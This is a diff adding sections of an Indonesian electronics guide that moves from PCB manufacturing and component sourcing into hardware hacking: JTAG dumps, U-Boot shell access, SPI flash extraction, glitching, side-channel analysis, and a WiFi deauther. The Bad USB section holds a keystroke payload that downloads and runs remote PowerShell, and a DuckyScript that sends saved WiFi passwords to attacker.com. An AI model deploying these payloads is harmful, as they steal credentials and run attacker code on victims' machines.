+<span class="num">10.</span> Electrical test (flying probe atau bed of nails)
+<span class="num">11.</span> Routing/depanelization + visual inspection</code></pre>
+
+  <h3>Surface Finish</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Finish</th><th>Nama</th><th>Shelf Life</th><th>Solderable</th><th>Catatan</th></tr></thead>
+    <tbody>
+      <tr><td><strong>HASL</strong></td><td>Hot Air Solder Leveling</td><td>12 bulan</td><td>Sangat baik</td><td>Murah, permukaan tidak rata (masalah fine-pitch)</td></tr>
+      <tr><td><strong>ENIG</strong></td><td>Electroless Nickel Immersion Gold</td><td>12 bulan</td><td>Sangat baik</td><td>Flat, cocok BGA/fine-pitch. Rentan "black pad"</td></tr>
+      <tr><td><strong>Lead-Free HASL</strong></td><td>HASL Pb-free</td><td>12 bulan</td><td>Baik</td><td>RoHS compliant, sedikit lebih kasar</td></tr>
+      <tr><td><strong>OSP</strong></td><td>Organic Solderability Preservative</td><td>6 bulan</td><td>Cukup</td><td>Tipis organik, murah, tidak tahan re-solder</td></tr>
+      <tr><td><strong>ENEPIG</strong></td><td>Electroless Ni/Pd/Au</td><td>12 bulan</td><td>Terbaik</td><td>Mahal, untuk RF dan wire bonding</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>SMT Assembly Process</h3>
+  <pre><code><span class="label">PROSES PCBA SMT:</span>
+
+<span class="num">1.</span> <span class="kw">Solder Paste Printing</span>
+   ├─ Stencil baja (laser cut) 0.12–0.15mm thick
+   └─ Squeegee paste di atas stencil
+
+<span class="num">2.</span> <span class="kw">Component Placement</span>
+   ├─ Pick & Place machine (PnP)
+   ├─ Input: centroid file (X, Y, rotation, reference)
+   └─ Komponen: dari tape reel, tray, atau tube
+
+<span class="num">3.</span> <span class="kw">Reflow Soldering</span>
+   ├─ Preheat zone (ramp up 1–3°C/s → 150–180°C)
+   ├─ Soak zone (150–180°C, 60–120s, flux activation)
+   ├─ Reflow zone (puncak 235–250°C, ≤30s)
+   └─ Cooling (maks 4°C/s ke bawah, cegah crack)
+
+<span class="num">4.</span> <span class="kw">Inspection</span>
+   ├─ AOI (Automated Optical Inspection)
+   ├─ X-ray (untuk BGA, QFN dengan hidden solder ball)
+   └─ Manual inspection
+
+<span class="num">5.</span> <span class="kw">Through-Hole Soldering</span>
+   ├─ Selective soldering atau
+   └─ Wave soldering</code></pre>
+
+  <h3>Defek Solder Umum dan Penyebab</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Defek</th><th>Penyebab</th><th>Solusi</th></tr></thead>
+    <tbody>
+      <tr><td>Solder bridge</td><td>Terlalu banyak paste, pad terlalu dekat</td><td>Kurangi aperture stencil, flux + wick</td></tr>
+      <tr><td>Tombstoning</td><td>Panas tidak merata di komponen 2-pin kecil</td><td>Symmetric thermal design, slow ramp</td></tr>
+      <tr><td>Cold solder (dull)</td><td>Gerakan saat cooling, suhu kurang</td><td>Naikkan peak temp, cegah vibrasi</td></tr>
+      <tr><td>Solder ball</td><td>Moisture di paste, preheat terlalu cepat</td><td>Simpan paste di kulkas, ramp lebih lambat</td></tr>
+      <tr><td>Insufficient solder</td><td>Paste coverage kurang, aperture tersumbat</td><td>Bersihkan stencil, tambah paste volume</td></tr>
+      <tr><td>Void di BGA</td><td>Moisture, flux outgassing</td><td>Pre-bake PCB dan komponen, vacuum reflow</td></tr>
+    </tbody>
+  </table></div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     11. BOM & SOURCING
+═════════════════════════════════════════════ -->
+<div class="section" id="komponen-sourcing">
+  <div class="section-label">§ 11 — Manufaktur</div>
+  <h2 class="section-title">BOM Management & Sourcing Komponen</h2>
+
+  <h3>Bill of Materials (BOM)</h3>
+  <p>BOM adalah daftar lengkap semua komponen dalam produk. Kolom esensial untuk PCB manufacturing:</p>
+  <pre><code><span class="cm">Kolom BOM minimal untuk PCBA:</span>
+<span class="var">Reference</span>  : R1, C3, U2, ...
+<span class="var">Value</span>      : 10kΩ, 100nF, STM32F103C8
+<span class="var">Footprint</span>  : 0402, 0805, LQFP48
+<span class="var">Quantity</span>   : per board
+<span class="var">MPN</span>        : Manufacturer Part Number (e.g. RC0402FR-0710KL)
+<span class="var">Manufacturer</span>: Yageo, Murata, STMicro
+<span class="var">Description</span>: Resistor 10kΩ 1% 62.5mW
+<span class="var">LCSC PN</span>    : C25804 (untuk order via JLCPCB/LCSC)</code></pre>
+
+  <h3>Sumber Komponen</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Supplier</th><th>Keunggulan</th><th>Min Order</th><th>Pengiriman ke ID</th></tr></thead>
+    <tbody>
+      <tr><td><strong>LCSC</strong></td><td>Harga murah, stok besar, terintegrasi JLCPCB</td><td>1–10 pcs</td><td>2–3 minggu DHL</td></tr>
+      <tr><td><strong>Mouser</strong></td><td>Stok luas, datasheet lengkap, distributor resmi</td><td>1 pcs</td><td>3–7 hari FedEx</td></tr>
+      <tr><td><strong>DigiKey</strong></td><td>Stok terbesar, cari cepat, dokumentasi baik</td><td>1 pcs</td><td>3–7 hari FedEx</td></tr>
+      <tr><td><strong>AliExpress</strong></td><td>Sangat murah, cocok prototyping, hati-hati palsu</td><td>1 pcs</td><td>2–4 minggu</td></tr>
+      <tr><td><strong>Tokopedia/Shopee</strong></td><td>Stok lokal, cepat, beli qty kecil</td><td>1 pcs</td><td>1–3 hari</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Fabrikasi PCB — Harga Perbandingan</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Fab House</th><th>2-layer 100×100mm/5pcs</th><th>Kualitas</th><th>Waktu</th></tr></thead>
+    <tbody>
+      <tr><td><strong>JLCPCB</strong></td><td>~$2 USD</td><td>Sangat baik</td><td>2–3 hari produksi</td></tr>
+      <tr><td><strong>PCBWay</strong></td><td>~$5 USD</td><td>Sangat baik</td><td>2–3 hari produksi</td></tr>
+      <tr><td><strong>AllPCB</strong></td><td>~$3 USD</td><td>Baik</td><td>2–3 hari produksi</td></tr>
+      <tr><td><strong>OSHPark</strong></td><td>~$10 USD</td><td>Premium</td><td>12 hari</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="callout tip">
+    <div class="callout-title">💡 Tips Manufaktur Produk</div>
+    Untuk prototype pertama: order PCB bare dari JLCPCB + komponen dari LCSC, gunakan SMT service JLCPCB (ekonomis untuk komponen basic). Untuk produksi &gt;100 pcs: minta quote dari PCBWay dengan full PCBA service. Selalu order 10–20% ekstra komponen untuk rework dan spare.
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     12. HARDWARE HACKING — RECON
+═════════════════════════════════════════════ -->
+<div class="section" id="hw-recon">
+  <div class="section-label">§ 12 — Hardware Hacking</div>
+  <h2 class="section-title">Hardware Recon & PCB Reverse Engineering</h2>
+
+  <h3>Tahapan Hardware Security Assessment</h3>
+  <pre><code><span class="label">METHODOLOGY:</span>
+<span class="num">1.</span> <span class="kw">OSINT</span>      : FCC ID database, datasheet, GitHub, Shodan
+<span class="num">2.</span> <span class="kw">Physical</span>   : Bongkar enclosure, foto PCB, ID komponen
+<span class="num">3.</span> <span class="kw">Recon</span>      : Identifikasi MCU, flash chip, debug interface
+<span class="num">4.</span> <span class="kw">Access</span>     : UART console, JTAG/SWD, SPI dump
+<span class="num">5.</span> <span class="kw">Firmware</span>   : Extract, analisis binwalk, strings, reverse
+<span class="num">6.</span> <span class="kw">Vulnerability</span>: Temukan bug, exploit
+<span class="num">7.</span> <span class="kw">Persistence</span>: Backdoor, implant, modifikasi firmware</code></pre>
+
+  <h3>Identifikasi Komponen di PCB</h3>
+  <p>Langkah-langkah identifikasi chips saat recon:</p>
+  <ul>
+    <li><strong>IC marking:</strong> Baca tulisan di chip. Format: logo mfr + part number + date code + lot</li>
+    <li><strong>Googling marking:</strong> Cari langsung. Chips custom kadang diobfuskasi (marking palsu atau dihapus)</li>
+    <li><strong>Package inference:</strong> QFP-64 → MCU menengah. BGA → SoC kompleks. SOIC-8 → Flash/EEPROM/OpAmp</li>
+    <li><strong>FCC ID:</strong> Setiap produk wireless yang dijual di AS punya FCC ID — fccid.io menyimpan foto internal PCB</li>
+    <li><strong>Test points:</strong> Cari via exposed atau header 2–10 pin. Biasanya UART, JTAG, atau power</li>
+  </ul>
+
+  <h3>Alat Hardware Hacking Esensial</h3>
+  <div class="card-grid">
+    <div class="card">
+      <div class="card-head">Debugging</div>
+      <div class="card-name">J-Link / ST-Link V2</div>
+      <p>Programmer + debugger ARM JTAG/SWD. ST-Link V2 clone ~$3 dari AliExpress.</p>
+    </div>
+    <div class="card">
+      <div class="card-head">USB–Serial</div>
+      <div class="card-name">CP2102 / CH340</div>
+      <p>USB ke UART adapter. CP2102 lebih stabil, CH340 murah. Wajib ada di toolkit.</p>
+    </div>
+    <div class="card">
+      <div class="card-head">Multi-Protocol</div>
+      <div class="card-name">Bus Pirate v3/v4</div>
+      <p>UART, SPI, I2C, 1-Wire, JTAG dari satu device USB. Open source.</p>
+    </div>
+    <div class="card">
+      <div class="card-head">Logic Analyzer</div>
+      <div class="card-name">Saleae / FX2LAFW</div>
+      <p>8–16 channel, decode UART/SPI/I2C/CAN secara real-time. Clone Saleae ~$10.</p>
+    </div>
+    <div class="card">
+      <div class="card-head">SPI Programmer</div>
+      <div class="card-name">CH341A</div>
+      <p>Baca/tulis flash SPI (25xxx) dan EEPROM (24xxx). ~$5, support astrorom/flashrom.</p>
+    </div>
+    <div class="card">
+      <div class="card-head">Glitching</div>
+      <div class="card-name">ChipWhisperer / DIY</div>
+      <p>Voltage/clock glitch platform. ChipWhisperer Lite ~$250. DIY dengan FPGA atau MCU cepat.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     13. JTAG / SWD
+═════════════════════════════════════════════ -->
+<div class="section" id="jtag-swd">
+  <div class="section-label">§ 13 — JTAG/SWD</div>
+  <h2 class="section-title">JTAG & SWD Debug Access</h2>
+
+  <h3>Menemukan JTAG Pins (JTAGulator / Manual)</h3>
+  <pre><code><span class="cm"># Menggunakan JTAGulator (tool khusus)</span>
+<span class="cm"># Hubungkan test points ke channel JTAGulator</span>
+<span class="cm"># Set voltase target (1.8V / 3.3V / 5V)</span>
+<span class="cm"># Run BYPASS scan untuk enumerate semua pin:</span>
+<span class="kw">Target voltage</span>: <span class="num">3.3</span>V
+<span class="kw">Number of channels</span>: <span class="num">8</span>
+<span class="kw">Run BYPASS</span> → <span class="cm">otomatis scan kombinasi TCK/TMS/TDI/TDO</span>
+
+<span class="cm"># Atau manual dengan oscilloscope/logic analyzer:</span>
+<span class="cm"># Pin TCK: square wave saat aktif</span>
+<span class="cm"># Pin TDO: output saat chain scan, perlu probe saat reset</span></code></pre>
+
+  <h3>OpenOCD — Open On-Chip Debugger</h3>
+  <pre><code><span class="cm"># Install</span>
+<span class="kw">sudo</span> apt install openocd
+
+<span class="cm"># Koneksi ke STM32 via ST-Link + SWD</span>
+<span class="kw">openocd</span> -f interface/stlink.cfg -f target/stm32f1x.cfg
+
+<span class="cm"># Di telnet (port 4444) atau GDB (port 3333):</span>
+<span class="kw">telnet</span> localhost <span class="num">4444</span>
+
+<span class="cm"># Di OpenOCD CLI:</span>
+> <span class="kw">halt</span>                         <span class="cm"># Halt CPU</span>
+> <span class="kw">reg</span>                          <span class="cm"># Lihat semua registers</span>
+> <span class="kw">mdw</span> <span class="num">0x08000000</span> <span class="num">32</span>           <span class="cm"># Dump 32 words dari flash</span>
+> <span class="kw">dump_image</span> fw.bin <span class="num">0x08000000</span> <span class="num">0x20000</span>  <span class="cm"># Dump firmware</span>
+> <span class="kw">flash write_image</span> erase patched.bin <span class="num">0x08000000</span>  <span class="cm"># Flash firmware</span>
+> <span class="kw">reset run</span></code></pre>
+
+  <h3>Mengatasi Read Protection (RDP)</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>RDP Level</th><th>STM32</th><th>Deskripsi</th><th>Bypass</th></tr></thead>
+    <tbody>
+      <tr><td>Level 0</td><td>Tidak ada proteksi</td><td>Flash dapat dibaca bebas</td><td>—</td></tr>
+      <tr><td>Level 1</td><td>Read protect</td><td>Debug interface diblokir. Flash tidak bisa di-dump via JTAG</td><td>Voltage glitch, cold boot attack, decap+probe</td></tr>
+      <tr><td>Level 2</td><td>Chip protect</td><td>Debug interface permanen disabled, tidak bisa di-reset</td><td>Decap+FIB+microprobing, difasilitasi fault injection</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="callout danger">
+    <div class="callout-title">⚡ Voltage Glitch bypass RDP1</div>
+    Beberapa STM32 series rentan terhadap voltage glitch pada VDD saat boot — CPU membaca RDP byte sebelum full protection aktif. Timing glitch pada nanosecond level dapat bypass RDP1. Tools: ChipWhisperer, custom FPGA dengan delay presisi. CVE tersedia untuk beberapa chip families.
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     14. UART CONSOLE
+═════════════════════════════════════════════ -->
+<div class="section" id="uart-console">
+  <div class="section-label">§ 14 — UART Console</div>
+  <h2 class="section-title">UART / Serial Console Access</h2>
+
+  <h3>Workflow UART Console Attack</h3>
+  <pre><code><span class="num">1.</span> Identifikasi & konfirmasi pins (lihat §06 di atas)
+
+<span class="num">2.</span> Sambungkan USB-UART adapter:
+   <span class="var">Device TX</span> → <span class="var">Adapter RX</span>
+   <span class="var">Device RX</span> → <span class="var">Adapter TX</span>
+   <span class="var">Device GND</span> → <span class="var">Adapter GND</span>
+   <span class="cm">JANGAN hubungkan VCC kecuali device tidak punya power!</span>
+   <span class="cm">Pastikan level voltage match (3.3V device + 5V adapter = RUSAK)</span>
+
+<span class="num">3.</span> Tentukan baud rate jika tidak diketahui:
+   <span class="cm"># Hitung secara manual dari oscilloscope:</span>
+   <span class="cm"># Baud = 1 / (lebar bit terpendek dalam detik)</span>
+   <span class="cm"># Atau coba automated dengan minicom/putty</span>
+   <span class="cm"># Baud rate umum: 9600, 38400, 57600, 115200, 230400</span>
+
+<span class="num">4.</span> Buka terminal:
+   <span class="kw">screen</span> /dev/ttyUSB0 <span class="num">115200</span>
+   <span class="cm"># atau</span>
+   <span class="kw">minicom</span> -b <span class="num">115200</span> -D /dev/ttyUSB0
+
+<span class="num">5.</span> Power on target — amati output boot</code></pre>
+
+  <h3>Hal yang Dicari di Boot Log</h3>
+  <ul>
+    <li>OS version & kernel version</li>
+    <li>U-Boot messages (bootloader) — sering bisa interrupt boot dengan key</li>
+    <li>Filesystem mount points</li>
+    <li>Network interface MAC & IP</li>
+    <li>Error messages yang mengandung path, library, binary names</li>
+    <li>Login prompt — coba default credentials (admin/admin, root/root, root/<em>blank</em>)</li>
+  </ul>
+
+  <h3>U-Boot Exploitation</h3>
+  <pre><code><span class="cm"># Interrupt U-Boot dengan tekan 'any key' saat countdown:</span>
+<span class="num">3</span>... <span class="num">2</span>... <span class="num">1</span>... <span class="cm">[tekan Enter/Space]</span>
+<span class="kw">U-Boot ></span>
+
+<span class="cm"># U-Boot commands berguna:</span>
+<span class="kw">printenv</span>              <span class="cm"># Lihat environment variables</span>
+<span class="kw">setenv bootargs</span> <span class="str">"... init=/bin/sh"</span>  <span class="cm"># Boot ke shell</span>
+<span class="kw">md.l</span> <span class="num">0x80000000</span> <span class="num">64</span>    <span class="cm"># Memory dump 64 words</span>
+<span class="kw">mw.l</span> <span class="num">0x80000000</span> <span class="num">0x1234</span> <span class="cm"># Memory write</span>
+<span class="kw">nand read</span> <span class="num">0x81000000</span> <span class="num">0x0</span> <span class="num">0x100000</span>  <span class="cm"># Baca NAND flash ke RAM</span>
+<span class="kw">tftp</span> <span class="num">0x81000000</span> firmware.bin       <span class="cm"># Load via TFTP</span></code></pre>
+</div>
+
+<!-- ════════════════════════════════════════════
+     15. SPI FLASH DUMP
+═════════════════════════════════════════════ -->
+<div class="section" id="flash-dump">
+  <div class="section-label">§ 15 — Flash Dump</div>
+  <h2 class="section-title">SPI Flash & EEPROM Dump</h2>
+
+  <h3>Identifikasi Flash Chip</h3>
+  <p>Flash SPI NOR biasanya SOIC-8 atau WSON-8. Chip populer:</p>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Manufacturer</th><th>Part Series</th><th>Kapasitas</th><th>Interface</th></tr></thead>
+    <tbody>
+      <tr><td>Winbond</td><td>W25Q16/32/64/128</td><td>2–16 MB</td><td>SPI (JEDEC)</td></tr>
+      <tr><td>Macronix</td><td>MX25L series</td><td>1–256 MB</td><td>SPI (JEDEC)</td></tr>
+      <tr><td>Spansion/Cypress</td><td>S25FL series</td><td>1–256 MB</td><td>SPI (JEDEC)</td></tr>
+      <tr><td>Microchip</td><td>SST25/26</td><td>1–8 MB</td><td>SPI</td></tr>
+      <tr><td>GigaDevice</td><td>GD25Q series</td><td>1–128 MB</td><td>SPI</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Dump dengan CH341A + flashrom</h3>
+  <pre><code><span class="cm"># Install flashrom</span>
+<span class="kw">sudo</span> apt install flashrom
+
+<span class="cm"># Hubungkan clip SOIC-8 ke CH341A dan ke chip</span>
+<span class="cm"># Pin assignment SOIC-8 (Winbond W25Q):</span>
+<span class="cm"># 1=CS, 2=MISO(DO), 3=WP#, 4=GND, 5=MOSI(DI), 6=CLK, 7=HOLD#, 8=VCC</span>
+
+<span class="cm"># Detect chip</span>
+<span class="kw">flashrom</span> -p ch341a_spi
+
+<span class="cm"># Dump firmware</span>
+<span class="kw">flashrom</span> -p ch341a_spi -r firmware_dump.bin
+
+<span class="cm"># Verifikasi dump (baca 2x, bandingkan)</span>
+<span class="kw">flashrom</span> -p ch341a_spi -r firmware_dump2.bin
+<span class="kw">md5sum</span> firmware_dump.bin firmware_dump2.bin
+
+<span class="cm"># Tulis firmware termodifikasi</span>
+<span class="kw">flashrom</span> -p ch341a_spi -w modified_firmware.bin</code></pre>
+
+  <h3>Analisis Firmware dengan binwalk</h3>
+  <pre><code><span class="cm"># Signature scan</span>
+<span class="kw">binwalk</span> firmware_dump.bin
+
+<span class="cm"># Extract semua filesystem/archive</span>
+<span class="kw">binwalk</span> -e firmware_dump.bin
+
+<span class="cm"># Recursive extract</span>
+<span class="kw">binwalk</span> -Me firmware_dump.bin
+
+<span class="cm"># Entropy analysis (detect encrypted sections)</span>
+<span class="kw">binwalk</span> -E firmware_dump.bin
+
+<span class="cm"># Output setelah extract: /root/_firmware_dump.bin.extracted/</span>
+<span class="cm"># Cari: /etc/passwd, /etc/shadow, credentials, private keys, hardcoded creds</span>
+<span class="kw">grep</span> -r <span class="str">"password"</span> ./_firmware_dump.bin.extracted/ <span class="num">2</span>>/dev/null
+<span class="kw">find</span> . -name <span class="str">"*.pem"</span> -o -name <span class="str">"*.key"</span> -o -name <span class="str">"id_rsa"</span></code></pre>
+
+  <h3>In-Circuit Dump (tanpa desoldering)</h3>
+  <p>Chip dapat dibaca <em>in-circuit</em> jika MCU di-halt terlebih dahulu (via JTAG/SWD). Pastikan:</p>
+  <ul>
+    <li>Target system OFF atau MCU di-halt agar tidak conflict di SPI bus</li>
+    <li>Pull CS line ke HIGH secara manual untuk isolasi sementara jika perlu</li>
+    <li>Clip Pomona 5250 atau IC test clip 8-pin untuk akses non-destructive</li>
+  </ul>
+</div>
+
+<!-- ════════════════════════════════════════════
+     16. FAULT INJECTION
+═════════════════════════════════════════════ -->
+<div class="section" id="fault-injection">
+  <div class="section-label">§ 16 — Fault Injection</div>
+  <h2 class="section-title">Fault Injection & Voltage Glitching</h2>
+
+  <h3>Konsep Fault Injection</h3>
+  <p>Menyebabkan kesalahan sementara pada hardware untuk bypass proteksi, skip instruksi, atau corrupt critical data. Dua teknik utama:</p>
+
+  <div class="cols2">
+    <div>
+      <h4>Voltage Glitching</h4>
+      <p>Injeksi singkat pada VCC — menyebabkan CPU miskompute instruksi. Target: saat membaca protection byte, saat check password, saat verifikasi signature.</p>
+    </div>
+    <div>
+      <h4>Clock Glitching</h4>
+      <p>Masukkan siklus clock ekstra atau hilangkan satu siklus. CPU mengeksekusi instruksi dengan state tidak valid. Lebih mudah timing-nya di beberapa target.</p>
+    </div>
+  </div>
+
+  <h3>Parameter Glitch</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Parameter</th><th>Deskripsi</th><th>Nilai Tipikal</th></tr></thead>
+    <tbody>
+      <tr><td>Glitch offset</td><td>Delay dari trigger ke glitch</td><td>Perlu sweep lebar</td></tr>
+      <tr><td>Glitch width</td><td>Durasi glitch (VCC drop)</td><td>10–200 nanosecond</td></tr>
+      <tr><td>Glitch voltage</td><td>Seberapa jauh VCC diturunkan</td><td>Biasanya 50–80% normal VCC</td></tr>
+      <tr><td>Trigger</td><td>Kapan mulai glitch — IO event, power trace, atau timer</td><td>Rising edge UART TX, atau GPIO output target</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Setup Glitch DIY (Budget)</h3>
+  <pre><code><span class="cm">/* Minimal DIY glitch setup dengan MOSFET cepat */</span>
+<span class="cm">/* N-Channel MOSFET (BSS138 atau AO3400) sebagai shunt ke GND */</span>
+
+<span class="cm">Komponen:</span>
+- MOSFET N-CH: AO3400 atau BSS138
+- Resistor gate: 10Ω (jaga stabilitas)
+- Kapasitor decoupling: 10µF dekat target VCC
+- MCU controller: STM32 atau RP2040 (resolusi timer ns)
+
+<span class="cm">Koneksi:</span>
+<span class="var">Target VCC</span> ─── <span class="var">10Ω</span> ─── <span class="var">MOSFET Drain</span>
+<span class="var">MOSFET Source</span> → <span class="var">GND</span>
+<span class="var">MOSFET Gate</span> ← <span class="var">Controller GPIO</span> (via 10Ω)
+
+<span class="cm">/* Pulse GPIO HIGH selama Tglitch nanoseconds */</span>
+<span class="cm">/* Timing kritis — gunakan DMA atau hardware timer */</span></code></pre>
+</div>
+
+<!-- ════════════════════════════════════════════
+     17. SIDE-CHANNEL
+═════════════════════════════════════════════ -->
+<div class="section" id="side-channel">
+  <div class="section-label">§ 17 — Side Channel</div>
+  <h2 class="section-title">Side-Channel Analysis (SCA)</h2>
+
+  <h3>Jenis Side-Channel Attack</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Tipe</th><th>Sinyal yang Diukur</th><th>Target Informasi</th><th>Tool</th></tr></thead>
+    <tbody>
+      <tr><td><strong>SPA (Simple Power)</strong></td><td>Konsumsi arus VCC</td><td>Key bits, branching code</td><td>Shunt resistor + oscilloscope/ADC</td></tr>
+      <tr><td><strong>DPA (Differential Power)</strong></td><td>Konsumsi arus (statistical)</td><td>Kunci kriptografi AES/DES</td><td>ChipWhisperer + analisis DPA</td></tr>
+      <tr><td><strong>EM (Electromagnetic)</strong></td><td>Emisi RF dari IC</td><td>Kunci kriptografi, program flow</td><td>RF probe + oscilloscope</td></tr>
+      <tr><td><strong>Timing</strong></td><td>Waktu eksekusi</td><td>Secret comparison, operasi kriptografi</td><td>Logic analyzer, precise timer</td></tr>
+      <tr><td><strong>Acoustic</strong></td><td>Suara komponen</td><td>RSA operasi (kapasitor koil whine)</td><td>Microphone sensitif</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Setup Power Analysis Minimal</h3>
+  <pre><code><span class="cm">/* Shunt resistor method */</span>
+<span class="cm">/* Pasang resistor 10–100Ω seri di jalur GND target */</span>
+<span class="cm">/* Ukur tegangan drop = proportional ke arus = proportional ke aktivitas CPU */</span>
+
+<span class="var">Target GND</span> ─── <span class="var">10Ω shunt</span> ─── <span class="var">GND</span>
+                    │
+              <span class="var">Oscilloscope CH1</span>
+              (differential probe atau
+               probe CH1 dan CH2,
+               ukur differential)
+
+<span class="cm">/* Setup ChipWhisperer — lebih bersih: */</span>
+<span class="cm">/* CWNano board punya built-in shunt + 10-bit/200MSps ADC */</span>
+<span class="cm">/* Capture power trace saat target mengeksekusi crypto */</span></code></pre>
+
+  <h3>DPA — Differential Power Analysis (Konsep)</h3>
+  <pre><code><span class="cm">/* DPA attack terhadap AES: */</span>
+<span class="num">1.</span> Encrypt banyak plaintext acak (biasanya 1000–100000 traces)
+<span class="num">2.</span> Rekam power trace tiap operasi
+<span class="num">3.</span> Pilih target intermediate value (misal: output S-Box byte ke-0)
+<span class="num">4.</span> Untuk setiap kandidat key byte (0–255):
+   - Hitung prediksi intermediate value untuk tiap plaintext
+   - Bagi traces ke dua kelompok berdasarkan bit target
+   - Hitung difference-of-means
+<span class="num">5.</span> Kandidat key yang menghasilkan peak korelasi tertinggi = key byte yang benar</code></pre>
+</div>
+
+<!-- ════════════════════════════════════════════
+     18. BAD USB / HID
+═════════════════════════════════════════════ -->
+<div class="section" id="bad-usb">
+  <div class="section-label">§ 18 — Produk Hacking</div>
+  <h2 class="section-title">Bad USB & HID Attack Devices</h2>
+
+  <h3>Prinsip Bad USB</h3>
+  <p>USB HID (Human Interface Device) attack — perangkat menyamar sebagai keyboard/mouse, diterima OS tanpa driver khusus, mengirim keystroke otomatis.</p>
+
+  <h3>Platform Bad USB</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Platform</th><th>MCU</th><th>Kecepatan</th><th>Fitur Extra</th><th>Form Factor</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Rubber Ducky</strong></td><td>AT32UC3</td><td>1000 wpm</td><td>Encrypted payload, SD card</td><td>USB-A flash drive</td></tr>
+      <tr><td><strong>RP2040 (DigiSpark)</strong></td><td>RP2040</td><td>Sangat cepat</td><td>Dual core, PIO</td><td>Kecil, murah ~$3</td></tr>
+      <tr><td><strong>Flipper Zero</strong></td><td>STM32WB55</td><td>Medium</td><td>Multi-attack: RFID/BLE/IR/RF</td><td>Handheld</td></tr>
+      <tr><td><strong>O.MG Cable</strong></td><td>ESP8266/custom</td><td>Medium</td><td>WiFi implant di kabel USB</td><td>Kabel USB tipikal</td></tr>
+      <tr><td><strong>Bash Bunny</strong></td><td>Linux SoC</td><td>Fast</td><td>Mass storage, Ethernet, WiFi</td><td>USB-A stick besar</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Build DIY Bad USB — STM32F103 (BluePill)</h3>
+  <pre><code><span class="cm">/* STM32F103C8T6 (BluePill) sebagai HID keyboard */</span>
+<span class="cm">/* Framework: Arduino + USB_HID library atau libopencm3 */</span>
+
+<span class="cm">// Contoh payload sederhana (Arduino + Keyboard.h)</span>
+<span class="kw">#include</span> &lt;Keyboard.h&gt;
+
+<span class="kw">void</span> <span class="fn">setup</span>() {
+  Keyboard.<span class="fn">begin</span>();
+  delay(<span class="num">1000</span>); <span class="cm">// Tunggu OS recognize device</span>
+  
+  <span class="cm">// Windows: buka Run dialog, jalankan PowerShell</span>
+  Keyboard.<span class="fn">press</span>(KEY_LEFT_GUI);
+  Keyboard.<span class="fn">press</span>(<span class="str">'r'</span>);
+  Keyboard.<span class="fn">releaseAll</span>();
+  delay(<span class="num">500</span>);
+  
+  Keyboard.<span class="fn">print</span>(<span class="str">"powershell -w h -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://c2/p')\"</span>);
+  Keyboard.<span class="fn">press</span>(KEY_RETURN);
+  Keyboard.<span class="fn">releaseAll</span>();
+}
+
+<span class="kw">void</span> <span class="fn">loop</span>() {}</code></pre>
+
+  <h3>Rubber Ducky Script (DuckyScript 3.0)</h3>
+  <pre><code><span class="cm">REM Exfil WiFi passwords via PowerShell</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> powershell -NoP -W Hidden -Exec Bypass
+<span class="kw">ENTER</span>
+<span class="kw">DELAY</span> <span class="num">800</span>
+<span class="kw">STRING</span> (netsh wlan show profiles) | Select-String ':(.*)' | %{$n=$_.Matches.Groups[1].Value.Trim(); $p=(netsh wlan show profile name="$n" key=clear) -match 'Key Content.*: (.*)'; if($p){Write-Output "$n : $(($p[0] -split ':')[1].Trim())"}} | Out-File $env:TEMP\w.txt; curl -F 'f=@$env:TEMP\w.txt' https://attacker.com/u
+<span class="kw">ENTER</span></code></pre>
+</div>
+
+<!-- ════════════════════════════════════════════
+     19. WIFI ATTACK HARDWARE
+═════════════════════════════════════════════ -->
+<div class="section" id="wifi-attack">
+  <div class="section-label">§ 19 — WiFi Attack</div>
+  <h2 class="section-title">WiFi Attack Hardware</h2>
+
+  <h3>Platform WiFi Attack</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Platform</th><th>Chip WiFi</th><th>Kapabilitas</th><th>Harga Approx</th></tr></thead>
+    <tbody>
+      <tr><td><strong>WiFi Pineapple</strong></td><td>AR9331 + AR9887</td><td>Evil twin, MITM, deauth, karma attack</td><td>~$120 (ori)</td></tr>
+      <tr><td><strong>ESP32 deauther</strong></td><td>ESP32</td><td>Deauth, beacon flood, probe flood</td><td>~$5 modul</td></tr>
+      <tr><td><strong>Alfa AWUS036ACH</strong></td><td>RTL8812AU</td><td>Monitor mode + injection, dual-band</td><td>~$40</td></tr>
+      <tr><td><strong>Raspberry Pi + adapter</strong></td><td>Various</td><td>Full attack platform, hostapd evil AP</td><td>Varies</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Build DIY Deauther dengan ESP8266</h3>
+  <pre><code><span class="cm">/* ESP8266 Deauther — firmware: github.com/SpacehuhnTech/esp8266_deauther */</span>
+<span class="cm">/* Upload firmware via Arduino IDE + ESP8266 board package */</span>
+<span class="cm">/* Interface: WiFi AP "pwned" atau Serial CLI */</span>
+
+<span class="cm">Board settings Arduino:</span>
+<span class="var">Board</span>      : NodeMCU 1.0 / Generic ESP8266 Module
+<span class="var">Flash Size</span> : 4MB (1MB SPIFFS)
+<span class="var">Upload Speed</span>: <span class="num">115200</span>
+
+<span class="cm">Setelah flash, connect ke AP "pwned" password "deauther"</span>
+<span class="cm">Web interface di 192.168.4.1</span>
